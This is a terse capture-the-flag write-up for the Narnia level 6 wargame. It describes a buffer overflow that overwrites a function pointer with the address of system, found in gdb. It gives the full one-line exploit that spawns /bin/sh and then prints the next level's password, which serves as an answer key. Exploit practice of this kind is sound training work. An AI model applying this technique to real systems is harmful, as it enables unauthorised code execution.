buffer overflow enables us to overwrite function pointer fp which is called with b1 as argument. Address of function pointer cannot be in the stack, as it is compared with the stack pointer. 

gdb narnia6
break main
run a b
info address system
system address is 0xf7e4c850
argument must be /bin/sh

buffer overflow using b2.

./narnia6 a bbbbbbbb/bin/sh$(echo -ne ";\x50\xc8\xe4\xf7")
cat /etc/narnia_pass/narnia7
ahkiaziphu
